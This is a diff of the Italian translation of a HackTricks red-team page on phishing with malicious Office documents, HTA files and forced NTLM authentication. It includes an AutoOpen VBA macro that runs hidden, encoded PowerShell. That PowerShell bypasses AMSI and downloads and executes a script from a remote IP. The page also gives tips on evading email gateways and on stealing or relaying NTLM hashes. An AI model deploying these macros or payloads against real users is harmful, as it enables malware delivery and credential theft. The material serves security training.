@@ -2,49 +2,47 @@
 
 <details>
 
-<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>
 
-* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata in HackTricks**? o vuoi avere accesso all'**ultima versione di PEASS o scaricare HackTricks in PDF**? Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
-* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
+* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la **tua azienda pubblicizzata su HackTricks**? o vuoi avere accesso all'**ultima versione del PEASS o scaricare HackTricks in PDF**? Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
+* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
 * Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Condividi i tuoi trucchi di hacking inviando PR al [repo hacktricks](https://github.com/carlospolop/hacktricks) e al [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Condividi i tuoi trucchi di hacking inviando PR al** [**repo di hacktricks**](https://github.com/carlospolop/hacktricks) **e al** [**repo di hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
 ## Documenti di Office
 
-Microsoft Word esegue la validazione dei dati del file prima di aprirlo. La validazione dei dati viene eseguita sotto forma di identificazione della struttura dei dati, secondo lo standard OfficeOpenXML. Se si verifica un errore durante l'identificazione della struttura dei dati, il file in analisi non verrà aperto.
+Microsoft Word esegue la convalida dei dati del file prima di aprirlo. La convalida dei dati viene eseguita sotto forma di identificazione della struttura dei dati, rispetto allo standard OfficeOpenXML. Se si verifica un errore durante l'identificazione della struttura dei dati, il file in fase di analisi non verrà aperto.
 
-Di solito, i file di Word contenenti macro utilizzano l'estensione `.docm`. Tuttavia, è possibile rinominare il file cambiando l'estensione del file e mantenere comunque la capacità di esecuzione delle macro.\
+Di solito, i file di Word contenenti macro utilizzano l'estensione `.docm`. Tuttavia, è possibile rinominare il file cambiando l'estensione del file e mantenere comunque le capacità di esecuzione delle macro.\
 Ad esempio, un file RTF non supporta le macro, per design, ma un file DOCM rinominato in RTF verrà gestito da Microsoft Word e sarà in grado di eseguire le macro.\
-Le stesse caratteristiche interne e meccanismi si applicano a tutti i software della suite Microsoft Office (Excel, PowerPoint, ecc.).
+Gli stessi interni e meccanismi si applicano a tutti i software della suite Microsoft Office (Excel, PowerPoint ecc.).
 
-È possibile utilizzare il seguente comando per verificare quali estensioni verranno eseguite da alcuni programmi di Office:
+Puoi utilizzare il seguente comando per verificare quali estensioni verranno eseguite da alcuni programmi di Office:
 ```bash
 assoc | findstr /i "word excel powerp"
 ```
-I file DOCX che fanno riferimento a un modello remoto (File - Opzioni - Componenti aggiuntivi - Gestisci: Modelli - Vai) che include macro possono "eseguire" anche le macro.
-
 ### Caricamento di immagini esterne
 
 Vai a: _Inserisci --> Parti rapide --> Campo_\
 _**Categorie**: Collegamenti e riferimenti, **Nomi dei campi**: includePicture, e **Nome file o URL**:_ http://\<ip>/qualsiasi
 
-![](<../../.gitbook/assets/image (316).png>)
+![](<../../.gitbook/assets/image (155).png>)
 
-### Backdoor delle macro
+### Backdoor dei macro
 
-È possibile utilizzare le macro per eseguire codice arbitrario dal documento.
+È possibile utilizzare i macro per eseguire codice arbitrario dal documento.
 
 #### Funzioni di caricamento automatico
 
-Più comuni sono, più probabile è che l'AV le rilevi.
+Più comuni sono, più probabile è che l'AV li rilevi.
 
 * AutoOpen()
 * Document\_Open()
 
-#### Esempi di codice delle macro
+#### Esempi di codice dei macro
 ```vba
 Sub AutoOpen()
 CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
@@ -76,12 +74,12 @@ proc.Create "powershell <beacon line generated>
 ```
 #### Rimuovere manualmente i metadati
 
-Vai su **File > Informazioni > Ispeziona documento > Ispeziona documento**, che aprirà l'Ispezionatore documento. Clicca su **Ispeziona** e poi su **Rimuovi tutto** accanto a **Proprietà documento e informazioni personali**.
+Vai su **File > Informazioni > Ispeziona documento > Ispeziona documento**, che aprirà l'Ispezionatore documento. Clicca su **Ispeziona** e poi su **Rimuovi tutto** accanto a **Proprietà del documento e informazioni personali**.
 
 #### Estensione del documento
 
-Quando hai finito, seleziona il menu a tendina **Salva come tipo**, cambia il formato da **`.docx`** a **Word 97-2003 `.doc`**.\
-Fai questo perché **non puoi salvare le macro all'interno di un `.docx`** e c'è uno **stigma** attorno all'estensione macro abilitata **`.docm`** (ad esempio, l'icona di anteprima ha un enorme `!` e alcuni gateway web/email le bloccano completamente). Pertanto, questa **estensione legacy `.doc` è il miglior compromesso**.
+Una volta finito, seleziona il menu a tendina **Salva come tipo**, cambia il formato da **`.docx`** a **Word 97-2003 `.doc`**.\
+Fallo perché non **puoi salvare i macro all'interno di un `.docx`** e c'è uno **stigma** attorno all'estensione macro abilitata **`.docm`** (ad esempio, l'icona miniatura ha un grande `!` e alcuni gateway web/email li bloccano completamente). Pertanto, questa **estensione legacy `.doc` è il miglior compromesso**.
 
 #### Generatori di macro maligne
 
@@ -91,9 +89,9 @@ Fai questo perché **non puoi salvare le macro all'interno di un `.docx`** e c'�
 
 ## File HTA
 
-Un file HTA è un programma Windows che **combina HTML e linguaggi di scripting (come VBScript e JScript)**. Genera l'interfaccia utente ed esegue come un'applicazione "completamente affidabile", senza i vincoli del modello di sicurezza di un browser.
+Un file HTA è un programma Windows che **combina HTML e linguaggi di scripting (come VBScript e JScript)**. Genera l'interfaccia utente ed esegue come un'applicazione "totalmente attendibile", senza i vincoli del modello di sicurezza di un browser.
 
-Un file HTA viene eseguito utilizzando **`mshta.exe`**, che di solito è **installato** insieme a **Internet Explorer**, rendendo **`mshta` dipendente da IE**. Quindi, se è stato disinstallato, gli HTA non saranno in grado di eseguire.
+Un file HTA viene eseguito utilizzando **`mshta.exe`**, che è tipicamente **installato** insieme a **Internet Explorer**, rendendo **`mshta` dipendente da IE**. Quindi, se è stato disinstallato, gli HTA non potranno essere eseguiti.
 ```html
 <--! Basic HTA Execution -->
 <html>
@@ -150,9 +148,9 @@ self.close
 ```
 ## Forzare l'autenticazione NTLM
 
-Ci sono diversi modi per **forzare l'autenticazione NTLM "a distanza"**, ad esempio, potresti aggiungere **immagini invisibili** alle email o all'HTML a cui l'utente accederà (anche HTTP MitM?). Oppure inviare alla vittima l'**indirizzo dei file** che **attiveranno** un'**autenticazione** solo per **aprire la cartella**.
+Ci sono diversi modi per **forzare l'autenticazione NTLM "da remoto"**, ad esempio, è possibile aggiungere **immagini invisibili** alle email o all'HTML a cui l'utente accederà (anche HTTP MitM?). Oppure inviare alla vittima l'**indirizzo dei file** che **attiveranno** un'**autenticazione** solo per **aprire la cartella**.
 
-**Controlla queste idee e altro nelle seguenti pagine:**
+**Controlla queste idee e altro nelle pagine seguenti:**
 
 {% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
 [printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
@@ -164,19 +162,19 @@ Ci sono diversi modi per **forzare l'autenticazione NTLM "a distanza"**, ad esem
 
 ### NTLM Relay
 
-Non dimenticare che non puoi solo rubare l'hash o l'autenticazione ma puoi anche **eseguire attacchi di NTLM relay**:
+Non dimenticare che non puoi solo rubare l'hash o l'autenticazione ma anche **eseguire attacchi di relay NTLM**:
 
-* [**Attacchi di NTLM Relay**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
-* [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
+* [**Attacchi di relay NTLM**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
+* [**AD CS ESC8 (relay NTLM ai certificati)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
 
 <details>
 
-<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata su HackTricks**? o vuoi avere accesso all'**ultima versione di PEASS o scaricare HackTricks in PDF**? Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
+* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata in HackTricks**? o vuoi avere accesso all'**ultima versione del PEASS o scaricare HackTricks in PDF**? Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
 * Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
-* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Condividi i tuoi trucchi di hacking inviando PR al [repo hacktricks](https://github.com/carlospolop/hacktricks) e al [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* Ottieni il [**PEASS & HackTricks swag ufficiale**](https://peass.creator-spring.com)
+* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Condividi i tuoi trucchi di hacking inviando PR al** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **e al** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
